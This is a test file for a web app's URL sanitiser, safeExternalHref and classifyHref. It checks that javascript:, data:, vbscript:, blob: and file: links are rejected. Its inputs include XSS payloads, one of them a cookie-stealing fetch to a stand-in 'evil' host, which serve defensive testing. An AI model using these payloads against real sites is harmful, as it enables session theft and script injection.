import { describe, expect, it } from "bun:test"
import { classifyHref, safeExternalHref } from "./safe-url"

const ORIGIN = "https://app.arda.io.vn"

describe("safeExternalHref", () => {
  it("keeps http and https", () => {
    expect(safeExternalHref("https://docs.arda.io.vn/problems/x/")).toBe(
      "https://docs.arda.io.vn/problems/x/",
    )
    expect(safeExternalHref("http://localhost:5002/x")).toBe("http://localhost:5002/x")
  })

  it("rejects script-bearing schemes", () => {
    // The exact shape a RAG citation or a notification href could carry.
    expect(safeExternalHref("javascript:fetch('//evil/'+document.cookie)")).toBe("")
    expect(safeExternalHref("JavaScript:alert(1)")).toBe("")
    expect(safeExternalHref("  javascript:alert(1)  ")).toBe("")
    expect(safeExternalHref("data:text/html,<script>alert(1)</script>")).toBe("")
    expect(safeExternalHref("vbscript:msgbox(1)")).toBe("")
    expect(safeExternalHref("blob:https://app.arda.io.vn/abc")).toBe("")
    expect(safeExternalHref("file:///etc/passwd")).toBe("")
  })

  it("rejects empty and relative values", () => {
    expect(safeExternalHref("")).toBe("")
    expect(safeExternalHref("   ")).toBe("")
    expect(safeExternalHref(null)).toBe("")
    expect(safeExternalHref(undefined)).toBe("")
    expect(safeExternalHref("/admin/users")).toBe("")
  })
})

describe("classifyHref", () => {
  it("returns same-origin values as router paths", () => {
    expect(classifyHref("/admin/users?page=2#top", ORIGIN)).toEqual({
      kind: "internal",
      href: "/admin/users?page=2#top",
    })
  })

  it("allows off-origin https only", () => {
    expect(classifyHref("https://docs.arda.io.vn/", ORIGIN)).toEqual({
      kind: "external",
      href: "https://docs.arda.io.vn/",
    })
    // http off-origin is a downgrade from a TLS origin, so it is refused.
    expect(classifyHref("http://evil.example/", ORIGIN)).toEqual({ kind: "blocked" })
  })

  // The bug this function exists to prevent: an origin check alone sends a
  // javascript: URL down the "external" branch, where location.assign runs it.
  it("blocks javascript: even though its origin is not this origin", () => {
    expect(new URL("javascript:alert(1)", ORIGIN).origin).toBe("null")
    expect(classifyHref("javascript:alert(1)", ORIGIN)).toEqual({ kind: "blocked" })
  })

  it("blocks data: and other schemes", () => {
    expect(classifyHref("data:text/html,<script>alert(1)</script>", ORIGIN)).toEqual({
      kind: "blocked",
    })
    expect(classifyHref("vbscript:msgbox(1)", ORIGIN)).toEqual({ kind: "blocked" })
  })

  it("blocks empty input", () => {
    expect(classifyHref("", ORIGIN)).toEqual({ kind: "blocked" })
    expect(classifyHref(null, ORIGIN)).toEqual({ kind: "blocked" })
  })
})
